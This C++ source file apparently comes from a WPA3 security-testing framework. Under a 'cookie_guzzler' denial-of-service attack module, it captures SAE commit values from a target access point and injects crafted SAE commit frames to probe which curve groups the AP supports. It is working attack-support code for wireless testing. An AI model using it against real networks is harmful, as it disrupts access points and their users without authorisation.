#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include <attacks/components/sniffer_helper.h>
#include <csignal>
#include <fstream>
#include <tins/hw_address.h>
#include <unistd.h>
#include <unordered_map>

#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/log.h"
#include <openssl/ec.h>
#include <openssl/obj_mac.h>
#include "pcap/pcap.h"
#include "system/hw_capabilities.h"
#include "system/utils.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::cookie_guzzler {
optional<sae_helper::SAEPair> capture_sae_commit(
	const HWAddress<6> &ap_mac, const int timeout_sec, pcap_t *handle, const string &iface) {
	char errbuf[PCAP_ERRBUF_SIZE];
	const bool owns = handle == nullptr;
	if(owns) {
		handle = pcap_open_live(iface.c_str(), 2000, 1, 100, errbuf);
		if(!handle) throw run_err("pcap_open_live failed: " + string(errbuf));
		pcap_setnonblock(handle, 1, errbuf);
	}
	auto guard = unique_ptr<pcap_t, void (*)(pcap_t *)>(owns ? handle : nullptr, [](pcap_t *h) {
		if(h) pcap_close(h);
	});

	const string filter_str = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
	bpf_program fp{};
	if(pcap_compile(handle, &fp, filter_str.c_str(), 1, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(handle, &fp);
	pcap_freecode(&fp);

	auto result = components::poll_sniffer<sae_helper::SAEPair>(
		handle,
		seconds(timeout_sec),
		[](const frame_raw_t &frame) -> optional<sae_helper::SAEPair> {
			if(frame.size() < 10) return nullopt; //FIXME magic numer
			if(auto f = sae_helper::parse_sae_commit(frame)) {
				log(LogLevel::DEBUG, "Captured SAE commit, scalar size: {}", f->scalar.size());
				return f;
			}
			return nullopt;
		},
		iface);

	if(holds_alternative<sae_helper::SAEPair>(result)) return get<sae_helper::SAEPair>(std::move(result));
	return nullopt;
}

static void kill_wpa_supplicant_daemon(const string &pid_file) {
	ifstream f(pid_file);
	pid_t pid = 0;
	if(f >> pid && pid > 0) {
		kill(pid, SIGTERM);
		log(LogLevel::DEBUG, "Sent SIGTERM to wpa_supplicant daemon PID {}", pid);
	}
}

void start_wpa_supplicant(RunStatus &rs, const string &iface, const string &conf_path, const string &pid_file) {
	if(rs.process_manager.process_exists("get_commit")) { rs.process_manager.stop("get_commit"); }
	if(filesystem::exists(pid_file)) {
		kill_wpa_supplicant_daemon(pid_file);
		filesystem::remove(pid_file);
	}

	const string socket = "/var/run/wpa_supplicant/" + iface;
	if(filesystem::exists(socket)) filesystem::remove(socket);

	log(LogLevel::INFO, "Run wpa_supplicant to get handshake values...");
	rs.process_manager.run("get_commit", { hostapd::get_wpa_supplicant("2.11"), "-B", "-i", iface, "-c", conf_path, "-P", pid_file });
}

static string create_wpa_supplicant_config(const string &ssid, const uint16_t sae_group = 0) {
	string conf_path = "/tmp/wpa3_guzzler_temp" + ssid;
	if(sae_group) conf_path += "_g" + to_string(sae_group);
	conf_path += ".conf";
	ofstream conf(conf_path);

	if(conf.is_open()) {
		conf << "ctrl_interface=/var/run/wpa_supplicant\n";
		conf << "update_config=1\n";
		if(sae_group) conf << "sae_groups=" << sae_group << "\n";
		conf << "network={\n";
		conf << "    ssid=\"" << ssid << "\"\n";
		conf << "    key_mgmt=SAE\n";
		conf << "    sae_password=\"anything123\"\n"; // password doesnt matter
		conf << "    ieee80211w=2\n";
		conf << "}\n";
		conf.close();
		set_public_perms(conf_path);
	}
	return conf_path;
}

optional<sae_helper::SAEPair> get_commit_values(RunStatus &rs, const string &iface, const string &sniff_iface,
	const string &ssid, const HWAddress<6> &ap_mac, const int timeout, const uint16_t sae_group) {
	if(iface == sniff_iface) throw invalid_argument("Interface names cant be same");
	const string pid_file = "/tmp/wpa_supplicant_get_commit_values.pid";
	const string conf_path = create_wpa_supplicant_config(ssid, sae_group);
	start_wpa_supplicant(rs, iface, filesystem::absolute(conf_path), pid_file);
	auto sae_params = capture_sae_commit(ap_mac, timeout, nullptr, sniff_iface);

	rs.process_manager.stop("get_commit");
	if(filesystem::exists(pid_file)) kill_wpa_supplicant_daemon(pid_file);
	filesystem::remove(pid_file);
	filesystem::remove(conf_path);
	return sae_params;
}

sae_helper::SAEPair make_probe_pair(const uint16_t gid) {
	// Generator G from tools/openssl/crypto/ec/ec_curve.c (_EC_X9_62_PRIME_256V1, _EC_NIST_PRIME_384/521).
	// scalar=2 satisfies SAE's [2, order-1]; element=G is always a valid curve point.
	static const map<uint16_t, int> nids = {
		{19, NID_X9_62_prime256v1}, {20, NID_secp384r1}, {21, NID_secp521r1}
	};
	EC_GROUP *grp = EC_GROUP_new_by_curve_name(nids.at(gid));
	const size_t len = (EC_GROUP_get_degree(grp) + 7) / 8;
	BIGNUM *x = BN_new(), *y = BN_new();
	EC_POINT_get_affine_coordinates(grp, EC_GROUP_get0_generator(grp), x, y, nullptr);

	sae_helper::SAEPair p;
	p.group_id = gid;
	p.scalar.assign(len, 0); p.scalar.back() = 2;
	p.element.resize(len * 2);
	BN_bn2binpad(x, p.element.data(), len);
	BN_bn2binpad(y, p.element.data() + len, len);
	BN_free(x); BN_free(y); EC_GROUP_free(grp);
	return p;
}

static unordered_map<uint16_t, sae_helper::SAEPair> probe_supported_groups(
	const HWAddress<6> &ap_mac, const HWAddress<6> &att_mac, const string &mon_iface) {
	unordered_map<uint16_t, sae_helper::SAEPair> result;
	PacketSender sender(mon_iface);

	for(const uint16_t gid : {static_cast<uint16_t>(19), static_cast<uint16_t>(20), static_cast<uint16_t>(21)}) {
		char errbuf[PCAP_ERRBUF_SIZE];
		// open before sending so AP's fast response lands in the kernel buffer
		pcap_t *handle = pcap_open_live(mon_iface.c_str(), 2000, 1, 100, errbuf);
		if(!handle) { log(LogLevel::WARNING, "probe group {}: pcap failed: {}", gid, errbuf); continue; }
		pcap_setnonblock(handle, 1, errbuf);

		auto pair = make_probe_pair(gid);
		auto frame = sae_helper::make_sae_commit(ap_mac, att_mac, pair);
		sender.send(frame);
		auto resp = capture_sae_commit(ap_mac, 2, handle, mon_iface);
		pcap_close(handle);

		if(resp && resp->status == 0 && !resp->scalar.empty()) {
			log(LogLevel::INFO, "Group {} supported", gid);
			result[gid] = std::move(pair);
		} else {
			log(LogLevel::WARNING, "Group {} not supported (status {})",
				gid, resp ? to_string(resp->status) : "no response");
		}
	}
	return result;
}

unordered_map<uint16_t, sae_helper::SAEPair> get_commit_values_all_groups(RunStatus &rs,
	const string &sniff_iface, const HWAddress<6> &ap_mac) {
	const ActorPtr att = rs.get_actor("attacker");
	const Channel ch = rs.get_actor("ap")->get_channel();

	// most mac80211 drivers: bringing managed iface UP resets the phy channel.
	// Bring it DOWN for the probe so we can fix the monitor to the AP's channel, then restore.
	att->set_mon_channel(ch);
	auto result = probe_supported_groups(ap_mac, att.get(SK::mac), sniff_iface);
	att->set_iface_up();
	return result;
}
}
